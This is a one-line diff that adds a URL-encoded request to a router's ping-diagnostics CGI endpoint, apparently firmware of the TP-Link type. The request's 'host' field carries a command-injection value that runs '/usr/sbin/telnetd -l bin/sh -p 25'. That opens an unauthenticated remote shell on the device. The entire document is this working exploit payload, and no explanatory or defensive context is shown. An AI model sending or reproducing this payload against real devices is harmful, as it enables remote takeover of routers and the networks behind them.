@@ -1,0 +1,1 @@
+/cgi?2&[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6%20dataBlockSize=64%20timeout=1%20numberOfRepetitions=1%20host=$(echo%20127.0.0.1;%20/usr/sbin/telnetd%20-l%20bin/sh%20-p%2025)%20X_TP_ConnName=ewan_ipoe_d%20diagnosticsState=Requested
